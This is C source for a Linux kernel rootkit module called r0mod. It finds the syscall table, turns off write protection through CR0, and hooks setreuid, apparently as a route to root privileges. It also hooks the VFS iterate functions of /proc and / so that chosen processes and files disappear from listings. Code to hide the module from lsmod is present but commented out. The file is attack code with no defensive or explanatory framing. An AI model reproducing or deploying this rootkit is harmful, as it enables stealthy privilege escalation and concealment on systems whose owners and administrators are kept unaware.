#include <linux/init.h>
#include <linux/kernel.h>

#include <asm/paravirt.h>   // write_cr0
#include <linux/unistd.h>   // syscalls
#include <linux/syscalls.h> // syscalls
#include <linux/capability.h>

#include <r0mod/global.h>

#define SEARCH_START    PAGE_OFFSET
#define SEARCH_END      ULONG_MAX //PAGE_OFFSET + 0xffffffff

unsigned long *sct;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
#else
static int (*proc_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
#define ITERATE_NAME readdir
#define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
#define FILLDIR_VAR filldir
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
{                                                   \
    ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);\
}
#else
static int (*proc_iterate)(struct file *file, struct dir_context *);
static int (*root_iterate)(struct file *file, struct dir_context *);
#define ITERATE_NAME iterate
#define ITERATE_PROTO struct file *file, struct dir_context *ctx
#define FILLDIR_VAR ctx->actor
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
{                                                   \
    *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC;    \
    ret = ITERATE_FUNC(file, ctx);                  \
}

struct s_proc_args
{
    unsigned short pid;
};

struct s_file_args
{
    unsigned short namelen;
    char *name;
};

struct hidden_proc {
    unsigned short pid;
    struct list_head list;
};

LIST_HEAD(hidden_procs);

struct hidden_file {
    char *name;
    struct list_head list;
};

LIST_HEAD(hidden_files);

struct
{
    unsigned long base;
    unsigned short limit;
} __attribute__ ((packed))idtr;

struct
{
    unsigned short off1;
    unsigned short off2;
    unsigned short sel;
    unsigned char none, flags;
} __attribute__ ((packed))idt;

unsigned long *find_sct(void)
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}

unsigned long *find_sct_by_addr_scan(void)
{
    unsigned long i;

    for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
    {
        unsigned long *sct = (unsigned long *)i;

        if(sct[__NR_close] == (unsigned long)sys_close)
            return sct;
    }

    return NULL;
}

void *get_vfs_iterate(const char *path)
{
    void *ret;

    struct file *filep;

    if((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

    ret = filep->f_op->ITERATE_NAME;

    filp_close(filep, 0);

    return ret;
}

void *get_vfs_read(const char *path)
{
    void *ret;

    struct file *filep;

    if((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

    ret = filep->f_op->read;

    filp_close(filep, 0);

    return ret;
}

void hide_file ( char *name )
{
    struct hidden_file *hf;

    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if ( ! hf )
        return;

    hf->name = name;

    list_add(&hf->list, &hidden_files);
}

void unhide_file ( char *name )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
    {
        if ( ! strcmp(name, hf->name) )
        {
            list_del(&hf->list);
            kfree(hf->name);
            kfree(hf);
            break;
        }
    }
}

void hide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

void unhide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    list_for_each_entry ( hp, &hidden_procs, list )
    {
        if ( pid == hp->pid )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
static int n_root_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct hidden_file *hf;

    list_for_each_entry(hf, &hidden_files, list)
    {
        if(!strcmp(name, hf->name))
            return 0;
    }

    return root_filldir(__buf, name, namelen, offset, ino, d_type);
}
#else
static int n_root_filldir(struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct hidden_file *hf;

    list_for_each_entry(hf, &hidden_files, list)
    {
        if(!strcmp(name, hf->name))
            return 0;
    }

    return root_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
}
#endif

int n_root_iterate(ITERATE_PROTO)
{
    int ret;

    root_filldir = FILLDIR_VAR;

    hijack_pause(root_iterate);
    REPLACE_FILLDIR(root_iterate, n_root_filldir);
    hijack_resume(root_iterate);

    return ret;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list )
        if ( pid == hp->pid )
            return 0;

    return proc_filldir(__buf, name, namelen, offset, ino, d_type);
}
#else
static int n_proc_filldir( struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list )
        if ( pid == hp->pid )
            return 0;

    return proc_filldir(npf_ctx, name, namelen, offset, ino, d_type);
}
#endif

int n_proc_iterate(ITERATE_PROTO)
{
    int ret;

    proc_filldir = FILLDIR_VAR;

    hijack_pause(proc_iterate);
    REPLACE_FILLDIR(proc_iterate, n_proc_filldir);
    hijack_resume(proc_iterate);

    return ret;
}

static int __init r0mod_init(void)
{
    DEBUG("Module starting...\n");

    //DEBUG("Hiding module object.\n");
    //list_del_init(&__this_module.list);               // Remove from lsmod
    //kobject_del(&THIS_MODULE->mkobj.kobj);            // Remove from FS?
    //kobject_del(&THIS_MODULE->holders_dir->parent);   // Remove from FS?

    DEBUG("Search Start: %lx\n", SEARCH_START);
    DEBUG("Search End:   %lx\n", SEARCH_END);

    return 0;

    #if defined(_CONFIG_X86_64_)
    if((sct = (void *)find_sct()) == NULL)
        DEBUG("sct == NULL * 1\n");
    #else
        sct = (void *)NULL;
    #endif

    if(sct == NULL && (sct = (void *)find_sct_by_addr_scan()) == NULL)
    {
        DEBUG("sct == NULL * 2\n");
        return -1;
    }

    DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);

    /* Hook /proc for hiding processes */
    //proc_iterate = get_vfs_iterate("/proc");
    //hijack_start(proc_iterate, &n_proc_iterate);

    /* Hook / for hiding files and directories */
    //root_iterate = get_vfs_iterate("/");
    //hijack_start(root_iterate, &n_root_iterate);

    write_cr0(read_cr0() & (~0x10000));

    orig_setreuid = (void *)sct[__NR_setreuid];
    sct[__NR_setreuid] = (unsigned long)new_setreuid;

    write_cr0(read_cr0() | 0x10000);

    return 0;
}

static void __exit r0mod_exit(void)
{
    DEBUG("Module ending...!\n");

    if(sct != NULL)
    {
        write_cr0(read_cr0() & (~0x10000));

        sct[__NR_setreuid] = (unsigned long)orig_setreuid;

        write_cr0(read_cr0() | 0x10000);
    }

    hijack_stop(root_iterate);
    hijack_stop(proc_iterate);
}

module_init(r0mod_init);
module_exit(r0mod_exit);

MODULE_LICENSE("GPL");
